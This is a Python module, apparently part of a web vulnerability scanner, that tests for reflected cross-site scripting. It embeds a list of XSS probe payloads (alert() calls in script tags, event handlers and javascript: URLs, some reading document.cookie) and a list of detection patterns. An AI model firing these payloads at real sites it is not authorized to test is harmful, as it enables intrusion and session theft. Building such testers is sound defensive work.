"""
XSS (Cross-Site Scripting) Vulnerability Tester
"""

import asyncio
import json
from typing import List, Dict
from pathlib import Path
from .base_tester import BaseVulnerabilityTester
import html


class XSSTester(BaseVulnerabilityTester):
    """Tests for XSS vulnerabilities"""
    
    def __init__(self, scanner_core, config, logger):
        super().__init__(scanner_core, config, logger)
        self._load_payloads()
    
    def _load_payloads(self):
        """Load XSS payloads from payloads_master.json"""
        try:
            # Intentar cargar de payloads_master.json primero
            master_file = Path(__file__).parent.parent.parent / 'PAYLOAD' / 'payloads_master.json'
            if master_file.exists():
                with open(master_file, 'r', encoding='utf-8') as f:
                    master_data = json.load(f)
                    xss_data = master_data.get('XSS', {})
                    # Extraer payloads del formato estructurado
                    self.payloads_list = []
                    for payload_obj in xss_data.get('payloads', []):
                        content = payload_obj.get('content', {})
                        if 'html' in content:
                            self.payloads_list.append(content['html'])
                        if 'raw' in content:
                            self.payloads_list.append(content['raw'])
                        if 'svg' in content:
                            self.payloads_list.append(content['svg'])
                    
                    if self.payloads_list:
                        self.logger.info(f"Loaded {len(self.payloads_list)} XSS payloads from payloads_master.json")
                        # Agregar también los payloads clásicos
                        self.payloads_list.extend(self._get_default_payloads())
                        return
            
            # Fallback a payloadsXSS.json
            payload_file = Path(__file__).parent.parent.parent / 'PAYLOAD' / 'payloadsXSS.json'
            with open(payload_file, 'r', encoding='utf-8') as f:
                self.payloads_list = json.load(f)
        except Exception as e:
            self.logger.warning(f"Could not load XSS payloads: {e}")
            self.payloads_list = self._get_default_payloads()
    
    def get_payloads(self) -> List[str]:
        """Get XSS payloads"""
        return self.payloads_list
    
    def _get_default_payloads(self) -> List[str]:
        """Default XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"-alert('XSS')-\"",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(document.domain)>",
        ]
    
    def check_vulnerability(self, response, baseline, payload) -> bool:
        """Check if response indicates XSS vulnerability"""
        if not response or not baseline:
            return False
        
        response_text = response.text
        response_lower = response_text.lower()
        
        # Check if payload appears unescaped in response
        # Normalize payload for comparison
        payload_lower = payload.lower()
        
        # Direct payload reflection
        if payload in response_text or payload_lower in response_lower:
            return True
        
        # Check for partial payload reflection (script tags, event handlers)
        xss_patterns = [
            '<script',
            'javascript:',
            'onerror=',
            'onload=',
            'onfocus=',
            'onmouseover=',
            'onclick=',
            'alert(',
            'confirm(',
            'prompt(',
            'document.cookie',
            'document.domain',
            'eval(',
            'expression(',
            '<iframe',
            '<embed',
            '<object',
            'vbscript:',
            'data:text/html',
        ]
        
        # Check if any XSS pattern from payload appears in response
        for pattern in xss_patterns:
            if pattern in payload_lower and pattern in response_lower:
                # Verify it's not HTML-encoded
                encoded_variants = [
                    html.escape(pattern),
                    pattern.replace('<', '&lt;').replace('>', '&gt;'),
                    pattern.replace('(', '&#40;').replace(')', '&#41;'),
                ]
                
                # If pattern exists but not in encoded form, it's vulnerable
                if pattern in response_lower:
                    is_encoded = any(enc.lower() in response_lower for enc in encoded_variants)
                    if not is_encoded:
                        return True
        
        # Check for context-based XSS
        # If response differs significantly and contains script-related content
        if self._response_differs_significantly(response, baseline):
            if any(pattern in response_lower for pattern in ['<script', 'onerror', 'javascript:']):
                return True
        
        return False
    
    def get_vulnerability_info(self) -> Dict[str, str]:
        """Return XSS vulnerability information"""
        return {
            'name': 'Cross-Site Scripting (XSS)',
            'severity': 'high',
            'description': 'The application is vulnerable to XSS, allowing attackers to inject malicious scripts into web pages viewed by other users.',
            'cwe': 'CWE-79',
            'owasp': 'A03:2021 - Injection',
            'impact': 'Session hijacking, credential theft, defacement, malware distribution, and phishing attacks.',
            'remediation': 'Encode output, validate input, use Content Security Policy (CSP), and implement proper context-aware escaping.'
        }
